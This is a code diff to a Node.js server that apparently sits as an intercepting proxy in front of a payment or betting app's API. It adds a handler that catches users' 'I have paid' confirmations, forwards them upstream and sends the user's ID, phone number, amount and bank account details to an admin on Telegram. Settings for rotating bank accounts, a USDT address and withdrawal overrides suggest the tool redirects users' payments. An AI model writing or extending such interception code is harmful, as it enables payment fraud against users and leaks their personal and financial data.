@@ -159,21 +159,24 @@ async function loadData(forceRefresh) {
 let dataSaveChain = Promise.resolve();
 
 async function saveDataUnlocked(data) {
-    const skipMerge = data._skipOverrideMerge;
-    if (skipMerge) delete data._skipOverrideMerge;
+    const isSkipMerge = data._skipOverrideMerge;
+    if (data._skipOverrideMerge) delete data._skipOverrideMerge;
     if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
     try {
-        if (!skipMerge) {
-            if (data._lastRedisSave && Date.now() - data._lastRedisSave < 10000) {
-                cachedData = data;
-                return;
+        let current = await redis.get('vivipayData');
+        if (current) {
+            if (typeof current === 'string') {
+                try { current = JSON.parse(current); } catch (e) { }
             }
-            const current = await redis.get('vivipayData');
-            if (current && typeof current === 'object') {
-                const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'nextClientIdOverride', 'bannedUsers'];
-                for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
-                if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
-                if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
+            if (typeof current === 'object' && current !== null) {
+                if (current.orderBankMap && typeof current.orderBankMap === 'object') {
+                    data.orderBankMap = { ...current.orderBankMap, ...(data.orderBankMap || {}) };
+                }
+                if (!isSkipMerge) {
+                    const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'nextClientIdOverride', 'bannedUsers'];
+                    for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
+                    if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
+                }
             }
         }
         cachedData = data;
@@ -2131,6 +2134,67 @@ app.all('/xxapi/*', async (req, res) => {
             return res.end(proofBody);
         }
 
+        // ── Process Payment Slips / "I Confirm I Have Paid" Interceptor ───────────
+        const isProcessPaymentSlip = req.method === 'POST' && (
+            urlLower.includes('processpaymentslip') ||
+            urlLower.includes('process_payment_slip') ||
+            urlLower.includes('finishpaymentslip') ||
+            urlLower.includes('finish_payment_slip')
+        );
+        if (isProcessPaymentSlip) {
+            const { response: procResp, respBody: procBody, respHeaders: procHeaders } = await proxyToTivox(req);
+            let procJson = null;
+            try { procJson = JSON.parse(procBody); } catch (e) { }
+
+            let procOrderId = '';
+            if (req.body && typeof req.body === 'object') {
+                procOrderId = req.body.order_id || req.body.orderId || req.body.orderNo || req.body.rptNo || '';
+            }
+            if (!procOrderId && req.rawBody) {
+                try {
+                    const ct = (req.headers['content-type'] || '').toLowerCase();
+                    let rb = {};
+                    if (ct.includes('multipart')) rb = parseMultipartFields(req.rawBody);
+                    else if (ct.includes('json')) rb = JSON.parse(req.rawBody.toString());
+                    else if (ct.includes('form')) rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
+                    procOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || '';
+                } catch (e) { }
+            }
+            if (!procOrderId) {
+                const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
+                procOrderId = qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || '';
+            }
+            procOrderId = String(procOrderId || '').trim();
+
+            const resolvedUid = String(req.headers['x-px-uid'] || (await resolveUserId(req)) || '');
+            const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
+            const userPhone = trackedUser.phone || '';
+
+            const isSuccess = procResp.status >= 200 && procResp.status < 300 && (!procJson || procJson.code === 0 || procJson.code === 200 || procJson.code === undefined);
+
+            if (isSuccess) {
+                const savedOrder = procOrderId ? getSavedOrderMapping(data, procOrderId) : null;
+                const orderAmt = (savedOrder && savedOrder.amount) || getOrderAmount(req, req.body || {}) || '';
+                const bankText = (savedOrder && savedOrder.bank) || (savedOrder ? `${savedOrder.accountHolder || ''} | ${savedOrder.accountNo || ''}${savedOrder.ifsc ? ' | ' + savedOrder.ifsc : ''}` : '');
+
+                const finishMsg = `╔══════════════════════════════════╗
+║   💰 USER CONFIRMED PAYMENT      ║
+╚══════════════════════════════════╝
+📋 <b>Order ID</b> : <code>${escapeTelegramHtml(procOrderId || 'N/A')}</code>
+👤 <b>User ID</b>  : <code>${escapeTelegramHtml(resolvedUid || 'N/A')}</code>${userPhone ? `\n📱 <b>Phone</b>    : <code>${escapeTelegramHtml(userPhone)}</code>` : ''}${orderAmt ? `\n💵 <b>Amount</b>   : <b>₹${orderAmt}</b>` : ''}${bankText ? `\n🏦 <b>Bank</b>     : <code>${escapeTelegramHtml(bankText)}</code>` : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ <b>User has completed the payment</b>
+⏳ <i>Status: Submission successful, waiting for review</i>
+🕐 <code>${now}</code>`;
+
+                notifyAdmin(data, finishMsg, { parse_mode: 'HTML' }).catch(() => { });
+            }
+
+            procHeaders['content-length'] = String(Buffer.byteLength(procBody));
+            res.writeHead(procResp.status, procHeaders);
+            return res.end(procBody);
+        }
+
         // ── Dedicated pickuppaymentslip Interceptor ───────────────────────────────
         // 1. Extracts order_id from request payload / query
         // 2. Extracts amount & real bank from response walletDomain (supports MobiKwik, Freecharge, AmazonPay, PhonePe, Paytm, etc.)
@@ -2140,23 +2204,9 @@ app.all('/xxapi/*', async (req, res) => {
         // 6. Sends Telegram BUY notification
         const isPickupPaymentSlip = req.method === 'POST' && urlLower.includes('pickuppaymentslip');
         if (isPickupPaymentSlip) {
-            let reqOrderId = '';
-            if (req.body && typeof req.body === 'object') {
+            let reqOrderId = getRequestOrderId(req);
+            if (!reqOrderId && req.body && typeof req.body === 'object') {
                 reqOrderId = req.body.order_id || req.body.orderId || req.body.orderNo || req.body.rptNo || '';
-            }
-            if (!reqOrderId && req.rawBody) {
-                try {
-                    const ct = (req.headers['content-type'] || '').toLowerCase();
-                    let rb = {};
-                    if (ct.includes('multipart')) rb = parseMultipartFields(req.rawBody);
-                    else if (ct.includes('json')) rb = JSON.parse(req.rawBody.toString());
-                    else if (ct.includes('form')) rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
-                    reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || '';
-                } catch (e) { }
-            }
-            if (!reqOrderId) {
-                const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-                reqOrderId = qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || '';
             }
             reqOrderId = String(reqOrderId || '').trim();
 
